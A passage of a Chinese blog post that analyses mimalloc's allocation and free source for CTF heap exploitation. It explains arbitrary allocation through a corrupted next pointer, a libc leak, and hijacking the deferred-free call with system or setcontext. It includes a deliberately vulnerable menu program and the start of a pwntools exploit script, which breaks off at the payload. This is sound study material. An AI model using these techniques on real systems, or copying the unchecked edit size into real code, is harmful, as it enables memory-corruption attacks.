_mi_page_thread_free_collect(page);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and the local free list</span></span><br><span class="line">  <span class="keyword">if</span> (page-&gt;local_free != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(page-&gt;<span class="built_in">free</span> == <span class="literal">NULL</span>)</span> &#123;</span><br><span class="line">      <span class="comment">// usual case</span></span><br><span class="line">      page-&gt;<span class="built_in">free</span> = page-&gt;local_free;</span><br><span class="line">      page-&gt;local_free = <span class="literal">NULL</span>;</span><br><span class="line">      page-&gt;free_is_zero = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (force) &#123;</span><br><span class="line">      <span class="comment">// append -- only on shutdown (force) as this is a linear operation</span></span><br><span class="line">      <span class="type">mi_block_t</span>* tail = page-&gt;local_free;</span><br><span class="line">      <span class="type">mi_block_t</span>* next;</span><br><span class="line">      <span class="keyword">while</span> ((next = mi_block_next(page, tail)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail = next;</span><br><span class="line">      &#125;</span><br><span class="line">      mi_block_set_next(page, tail, page-&gt;<span class="built_in">free</span>);</span><br><span class="line">      page-&gt;<span class="built_in">free</span> = page-&gt;local_free;</span><br><span class="line">      page-&gt;local_free = <span class="literal">NULL</span>;</span><br><span class="line">      page-&gt;free_is_zero = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mi_assert_internal(!force || page-&gt;local_free == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始首先收集thread_free中的内存块 接下来收集free和local_free的内存块 这里来分析一下逻辑</p><p>如果loacl_free链表不为空 进入if分支 检测free链表是否为空 如果为空 则将local_free链表移到free链表中 同时没有做任何的检查 也就意味着这里我们可以做到任意地址申请 只需要想办法覆盖local_free链表</p><h3 id="mi-heap-malloc-small-zero"><a href="#mi-heap-malloc-small-zero" class="headerlink" title="mi_heap_malloc_small_zero"></a>mi_heap_malloc_small_zero</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> mi_decl_restrict <span class="type">void</span>* <span class="title function_">mi_heap_malloc_small_zero</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero)</span> mi_attr_noexcept &#123;</span><br><span class="line">  mi_assert(heap != <span class="literal">NULL</span>);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_DEBUG</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uintptr_t</span> tid = _mi_thread_id();</span><br><span class="line">  mi_assert(heap-&gt;thread_id == <span class="number">0</span> || heap-&gt;thread_id == tid); <span class="comment">// heaps are thread local</span></span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  mi_assert(size &lt;= MI_SMALL_SIZE_MAX);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> (MI_PADDING)</span></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123; size = <span class="keyword">sizeof</span>(<span class="type">void</span>*); &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">mi_page_t</span>* page = _mi_heap_get_free_small_page(heap, size + MI_PADDING_SIZE);</span><br><span class="line">  <span class="type">void</span>* <span class="type">const</span> p = _mi_page_malloc(heap, page, size + MI_PADDING_SIZE, zero);  </span><br><span class="line">  mi_track_malloc(p,size,zero);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_STAT&gt;1</span></span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mi_heap_is_initialized(heap)) &#123; heap = mi_prim_get_default_heap(); &#125;</span><br><span class="line">    mi_heap_stat_increase(heap, <span class="built_in">malloc</span>, mi_usable_size(p));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_DEBUG&gt;3</span></span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; zero) &#123;</span><br><span class="line">    mi_assert_expensive(mi_mem_is_zero(p, size));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑还是比较简单的 就是通过_mi_heap_get_free_small_page函数获取到适合small内存块的page 随后调用 _mi_page_malloc来申请内存块 剩余的部分就是一些check和计数信息的更新</p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>那么到这里我们可以做一个大概的总结 首先进入mi_malloc函数 对于要申请的内存块的size进行了判断 如果小于0x400则进入 mi_heap_malloc_small_zero函数 如果大于0x400则进入_mi_malloc_generic函数</p><p>如果是进入mi_heap_malloc_small_zero函数 那么会调用 _mi_page_malloc来获取内存块</p><p>该函数通过page的free链表来获取相应的内存块</p><p>如果是_mi_malloc_generic函数 那么会调用mi_find_page函数来寻找可用的page 该函数继续索引到mi_find_free_page函数来寻找page</p><p>根据是否开启了debug模式来调用_mi_page_free_collect函数 如果开启了debug模式 就不会预编译对应的else分支 如果关闭了debug模式 就会进入该函数  一开始先根据force参数或者是mi_page_thread_free函数的返回值来决定是否要调用thread_free  接着检查local_free链表 根据free链表是否为空 来考虑是否要把local_free链表存放到free链表中</p><p>两种情况最后都是进入了mi_page_queue_find_free_ex函数 遍历retire链表 如果没有空闲的page就初始化一个新的page 如果初始化失败 就再次调用mi_page_queue_find_free_ex函数</p><h3 id="mi-free"><a href="#mi-free" class="headerlink" title="mi_free"></a>mi_free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mi_free</span><span class="params">(<span class="type">void</span>* p)</span> mi_attr_noexcept</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(p == <span class="literal">NULL</span>)</span> <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">mi_segment_t</span>* <span class="type">const</span> segment = mi_checked_ptr_segment(p,<span class="string">&quot;mi_free&quot;</span>);</span><br><span class="line">  <span class="type">const</span> <span class="type">bool</span>          is_local= (_mi_prim_thread_id() == mi_atomic_load_relaxed(&amp;segment-&gt;thread_id));</span><br><span class="line">  <span class="type">mi_page_t</span>* <span class="type">const</span>    page    = _mi_segment_page_of(segment, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(is_local)</span> &#123;                       <span class="comment">// thread-local free?</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(page-&gt;flags.full_aligned == <span class="number">0</span>)</span>  <span class="comment">// and it is not a full page (full pages need to move from the full bin), nor has aligned blocks (aligned blocks need to be unaligned)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">mi_block_t</span>* <span class="type">const</span> block = (<span class="type">mi_block_t</span>*)p;</span><br><span class="line">      <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(mi_check_is_double_free(page, block))</span> <span class="keyword">return</span>;</span><br><span class="line">      mi_check_padding(page, block);</span><br><span class="line">      mi_stat_free(page, block);</span><br><span class="line">      <span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED  &amp;&amp; !MI_TSAN</span></span><br><span class="line">      <span class="built_in">memset</span>(block, MI_DEBUG_FREED, mi_page_block_size(page));</span><br><span class="line">      <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      mi_track_free_size(p, mi_page_usable_size_of(page,block)); <span class="comment">// faster then mi_usable_size as we already know the page and that p is unaligned</span></span><br><span class="line">      mi_block_set_next(page, block, page-&gt;local_free);</span><br><span class="line">      page-&gt;local_free = block;</span><br><span class="line">      <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(--page-&gt;used == <span class="number">0</span>)</span> &#123;   <span class="comment">// using this expression generates better code than: page-&gt;used--; if (mi_page_all_free(page))</span></span><br><span class="line">        _mi_page_retire(page);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// page is full or contains (inner) aligned blocks; use generic path</span></span><br><span class="line">      _mi_free_generic(segment, page, <span class="literal">true</span>, p);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// not thread-local; use generic path</span></span><br><span class="line">    _mi_free_generic(segment, page, <span class="literal">false</span>, p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始调用相关函数获取内存块对应的page和segment</p><p>接下来对于是否为同线程的内存块进行了判断 如果是其他线程的内存块 直接调用_mi_free_generic函数进行额外的情况</p><p>page-&gt;flags.full_aligned成员是用来查看该page是否需要内存对齐的 如果申请的大小刚好等于页的大小 那么内部就不用进行内存对齐 释放也直接调用_mi_free_generic函数来进行</p><p>接着检查了是否存在double free的情况(这里吐槽一下 我觉得这个check太仁慈了 就算检测出来 竟然也没有直接终止进程 你说就输出个报错有啥用阿哥 甚至你不开debug模式都不会进行double free检测)</p><p>mi_check_padding函数主要是调试模式下 会出申请padding的内存 用来存放字节 供检测是否出现内存越界的情况 没有开启debug模式的话 直接就可以忽略掉这个函数</p><p>mi_stat_free是用来统计free内存块的信息</p><p>可以看到最后   是更新了page的local_free链表  而非free链表 也就是说释放的内存块会优先进入local_free链表</p><p>接着根据page-&gt;used的值来判断page是否都是空闲内存块 如果是 则retire整个page</p><h3 id="mi-check-is-double-free"><a href="#mi-check-is-double-free" class="headerlink" title="mi_check_is_double_free"></a>mi_check_is_double_free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mi_track_page(page,access)  &#123; size_t psize; void* pstart = _mi_page_start(_mi_page_segment(page),page,&amp;psize); mi_track_mem_##access( pstart, psize); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">mi_check_is_double_free</span><span class="params">(<span class="type">const</span> <span class="type">mi_page_t</span>* page, <span class="type">const</span> <span class="type">mi_block_t</span>* block)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> is_double_free = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">mi_block_t</span>* n = mi_block_nextx(page, block, page-&gt;keys); <span class="comment">// pretend it is freed, and get the decoded first field</span></span><br><span class="line">  <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)n &amp; (MI_INTPTR_SIZE<span class="number">-1</span>))==<span class="number">0</span> &amp;&amp;  <span class="comment">// quick check: aligned pointer?</span></span><br><span class="line">      (n==<span class="literal">NULL</span> || mi_is_in_same_page(block, n))) <span class="comment">// quick check: in same page or NULL?</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Suspicous: decoded value a in block is in the same page (or NULL) -- maybe a double free?</span></span><br><span class="line">    <span class="comment">// (continue in separate function to improve code generation)</span></span><br><span class="line">    is_double_free = mi_check_is_double_freex(page, block);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> is_double_free;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">mi_check_is_double_free</span><span class="params">(<span class="type">const</span> <span class="type">mi_page_t</span>* page, <span class="type">const</span> <span class="type">mi_block_t</span>* block)</span> &#123;</span><br><span class="line">  MI_UNUSED(page);</span><br><span class="line">  MI_UNUSED(block);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过mi_block_nextx函数来获取内存块的next成员 如果为0或者和内存块位于同一个page 那么就会进入mi_check_is_double_freex函数进行更加详细的check 如果不开启debug模式的话 不会进行double free检测</p><h3 id="mi-check-is-double-freex"><a href="#mi-check-is-double-freex" class="headerlink" title="mi_check_is_double_freex"></a>mi_check_is_double_freex</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> mi_decl_noinline <span class="type">bool</span> <span class="title function_">mi_check_is_double_freex</span><span class="params">(<span class="type">const</span> <span class="type">mi_page_t</span>* page, <span class="type">const</span> <span class="type">mi_block_t</span>* block)</span> &#123;</span><br><span class="line">  <span class="comment">// The decoded value is in the same page (or NULL).</span></span><br><span class="line">  <span class="comment">// Walk the free lists to verify positively if it is already freed</span></span><br><span class="line">  <span class="keyword">if</span> (mi_list_contains(page, page-&gt;<span class="built_in">free</span>, block) ||</span><br><span class="line">      mi_list_contains(page, page-&gt;local_free, block) ||</span><br><span class="line">      mi_list_contains(page, mi_page_thread_free(page), block))</span><br><span class="line">  &#123;</span><br><span class="line">    _mi_error_message(EAGAIN, <span class="string">&quot;double free detected of block %p with size %zu\n&quot;</span>, block, mi_page_block_size(page));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过遍历page的三个链表来查找内存块是否已经被释放过了</p><p>相对来说比较好绕过 只要更改链表头的next成员 就可以让链表索引不到已经被释放过的内存块</p><h3 id="mi-free-generic"><a href="#mi-free-generic" class="headerlink" title="_mi_free_generic"></a>_mi_free_generic</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> mi_decl_noinline _mi_free_generic(<span class="type">const</span> <span class="type">mi_segment_t</span>* segment, <span class="type">mi_page_t</span>* page, <span class="type">bool</span> is_local, <span class="type">void</span>* p) mi_attr_noexcept &#123;</span><br><span class="line">  <span class="type">mi_block_t</span>* <span class="type">const</span> block = (mi_page_has_aligned(page) ? _mi_page_ptr_unalign(segment, page, p) : (<span class="type">mi_block_t</span>*)p);</span><br><span class="line">  mi_stat_free(page, block);    <span class="comment">// stat_free may access the padding</span></span><br><span class="line">  mi_track_free_size(block, mi_page_usable_size_of(page,block));</span><br><span class="line">  _mi_free_block(page, is_local, block);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始先进行了内存对齐的检测 随后就是老一套的内存块信息的记录</p><p>随后调用_mi_free_block函数释放内存块</p><h3 id="mi-free-block"><a href="#mi-free-block" class="headerlink" title="_mi_free_block"></a>_mi_free_block</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> _mi_free_block(<span class="type">mi_page_t</span>* page, <span class="type">bool</span> local, <span class="type">mi_block_t</span>* block)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// and push it on the free list</span></span><br><span class="line">  <span class="comment">//const size_t bsize = mi_page_block_size(page);</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(local)</span> &#123;</span><br><span class="line">    <span class="comment">// owning thread can free a block directly</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(mi_check_is_double_free(page, block))</span> <span class="keyword">return</span>;</span><br><span class="line">    mi_check_padding(page, block);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN</span></span><br><span class="line">    <span class="keyword">if</span> (!mi_page_is_huge(page)) &#123;   <span class="comment">// huge page content may be already decommitted</span></span><br><span class="line">      <span class="built_in">memset</span>(block, MI_DEBUG_FREED, mi_page_block_size(page));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    mi_block_set_next(page, block, page-&gt;local_free);</span><br><span class="line">    page-&gt;local_free = block;</span><br><span class="line">    page-&gt;used--;</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(mi_page_all_free(page))</span> &#123;</span><br><span class="line">      _mi_page_retire(page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> mi_unlikely(mi_page_is_in_full(page)) &#123;</span><br><span class="line">      _mi_page_unfull(page);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    _mi_free_block_mt(page,block);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍然是先进行了内存越界和double free的检测 同时根据是否开启了debug模式 来决定是否要调用memset函数清空内存块的内容</p><p>随后就是更新local_free链表和used的值 接着检查是否要释放整个page 或者是当前page是否已经成为满页 如果是满页则从满页列表中移除</p><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p>总结一下释放 实际上就是先进行没啥软用的double free检查 然后根据要释放的内存块是否就是整个page 来决定要不要用_mi_free_generic函数来释放</p><p>释放完的话 是加入到local_free链表 并且used的值会减少 相对来说逻辑还是比较简单的</p><h2 id="实例利用"><a href="#实例利用" class="headerlink" title="实例利用"></a>实例利用</h2><h3 id="泄露libc基址和任意写"><a href="#泄露libc基址和任意写" class="headerlink" title="泄露libc基址和任意写"></a>泄露libc基址和任意写</h3><p>在泄露libc基址上同ptmalloc不一样 因为供用户申请的内存块就算被释放后 也不会根据大小进入bin中 从而在fd域或者bk域写入libc地址 我们在获得一个内存块后 只能获得其next域的下一个内存块的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021534229.png" title="image-20230802153413131" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021534229.png" alt="image-20230802153413131"></a></p><p>而在获得内存块后 我们就可以计算得到page的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021535806.png" title="image-20230802153526770" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021535806.png" alt="image-20230802153526770"></a></p><p>page中就存放着libc地址 经过偏移计算即可得到libc基址</p><p>问题在于如何构造任意写 经过上面的源码分析我们可以得知 内存块的申请是优先从free链表中获取的 如果我们拥有溢出的机会 修改下一个内存块的next域 是不是就可以实现任意地址申请</p><p>同时还需要注意一点 由于mimalloc内存地址的特殊性 如果我们申请的内存块过小 就会导致低字节处\x00 截断输出 进而妨碍我们泄露内存块地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021538342.png" title="image-20230802153814311" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021538342.png" alt="image-20230802153814311"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021544240.png" title="image-20230802154451205" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021544240.png" alt="image-20230802154451205"></a></p><p>可以看到此时free链表中已经写入了我们想要用来泄露libc地址的fake chunk</p><p>此时我们再次申请出同样size的两个内存块 打印第二个内存块的内容 就可以得到_mi_heap_main的地址 从而泄露libc基址</p><p>同时要注意一下 libc基址和libmimalloc基址是不一样的</p><h4 id="2-34以上的libc版本"><a href="#2-34以上的libc版本" class="headerlink" title="2.34以上的libc版本"></a>2.34以上的libc版本</h4><p>由于2.34以上的版本的tls结构体的偏移进行了随机化 所以还需要进行爆破一个字节才能得到正确的libc的基址</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>回顾一下mi_malloc_generic函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call potential deferred free routines</span></span><br><span class="line">  _mi_deferred_free(heap, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>会发现其调用了这个函数 当时我的分析是将标记释放的内存块加入到延迟释放链表中</p><p>而在ida的汇编代码中你可以看到 其是通过call指令来调用的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604632.png" title="image-20230802160433594" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604632.png" alt="image-20230802160433594"></a></p><p>偏偏这个地址还是可写的  所以我们可以通过往这个地址写入system函数 从而进行任意函数调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604794.png" title="image-20230802160454759" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021604794.png" alt="image-20230802160454759"></a></p><p>但是很快你会发现我们并没有办法控制rdi寄存器</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021727558.png" title="image-20230802172730420" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308021727558.png" alt="image-20230802172730420"></a></p><p>但是可以控制rdx寄存器 联想ptmalloc我们是如何实现的orw 就会想到setcontext这一手法</p><h3 id="调试题目和脚本"><a href="#调试题目和脚本" class="headerlink" title="调试题目和脚本"></a>调试题目和脚本</h3><p>需要的可以自行下载或者编译</p><p>链接: <a href="https://pan.baidu.com/s/1R6jhSAod4g8RQZT9tQSg_g?pwd=d193">https://pan.baidu.com/s/1R6jhSAod4g8RQZT9tQSg_g?pwd=d193</a> 提取码: d193 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;mimalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *chunk_ptr[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> chunk_size[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.mi_malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.mi_free&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_read</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>];</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size :&quot;</span>);</span><br><span class="line">    size = my_read();</span><br><span class="line">    chunk_size[count] = size;</span><br><span class="line">    chunk_ptr[count] = mi_malloc(size);</span><br><span class="line">    count ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = my_read();</span><br><span class="line">    mi_free(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = my_read();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> size = my_read();</span><br><span class="line">    read(<span class="number">0</span>,chunk_ptr[index],size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = my_read();</span><br><span class="line">    <span class="built_in">puts</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> choice = my_read();</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Unknown option&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./mimalloc_heap&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123.56.236.235&quot;,39254)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./mimalloc_heap&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10140</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = 